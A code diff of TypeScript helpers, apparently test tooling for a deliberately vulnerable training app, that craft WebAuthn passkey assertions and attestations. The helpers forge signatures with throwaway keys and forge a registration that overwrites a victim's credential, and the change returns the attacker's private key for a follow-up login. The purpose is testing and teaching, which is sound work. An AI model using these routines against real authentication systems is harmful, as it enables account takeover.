@@ -80,7 +80,7 @@ function clientDataJSON (type: 'webauthn.get' | 'webauthn.create', challenge: st
 /**
  * Mint an ES256 assertion for the victim credential. With `tamper` the signature is produced with a
  * throwaway key of the same curve: well-formed DER that fails verification against the victim's
- * stored public key (the "Passkey Signature Forgery" exploit). A genuine assertion is signed with
+ * stored public key (the "Passkey Bypass" exploit). A genuine assertion is signed with
  * the victim's own key.
  */
 export function buildAssertion (victim: VictimCredential, challenge: string, { tamper, counter = 1, origin = ORIGIN, flags = 0x05 }: { tamper: boolean, counter?: number } & CraftOptions): WebAuthnAssertion {
@@ -106,11 +106,11 @@ export function buildAssertion (victim: VictimCredential, challenge: string, { t
 
 /**
  * Forge a registration for an arbitrary credentialID using a freshly generated attacker keypair
- * (the "Passkey Credential Overwrite" exploit). Returns the attestation and the base64url COSE
- * public key the server is expected to persist.
+ * (the "Passkey Hijack" exploit). Returns the attestation, the base64url COSE public key the server
+ * is expected to persist, and the attacker's private key so a follow-up login can be signed with it.
  */
-export function buildAttestation (credentialID: string, challenge: string, { origin = ORIGIN, flags = 0x45 }: CraftOptions = {}): { attestation: WebAuthnAttestation, publicKey: string } {
-  const { publicKey } = crypto.generateKeyPairSync('ec', { namedCurve: 'P-256' })
+export function buildAttestation (credentialID: string, challenge: string, { origin = ORIGIN, flags = 0x45 }: CraftOptions = {}): { attestation: WebAuthnAttestation, publicKey: string, privateKeyPem: string } {
+  const { publicKey, privateKey } = crypto.generateKeyPairSync('ec', { namedCurve: 'P-256' })
   const cose = coseFromJwk(publicKey.export({ format: 'jwk' }) as { x: string, y: string })
 
   const credId = isoBase64URL.toBuffer(credentialID)
@@ -139,7 +139,8 @@ export function buildAttestation (credentialID: string, challenge: string, { ori
         transports: ['internal']
       }
     },
-    publicKey: isoBase64URL.fromBuffer(cose)
+    publicKey: isoBase64URL.fromBuffer(cose),
+    privateKeyPem: privateKey.export({ format: 'pem', type: 'pkcs8' }).toString()
   }
 }
 
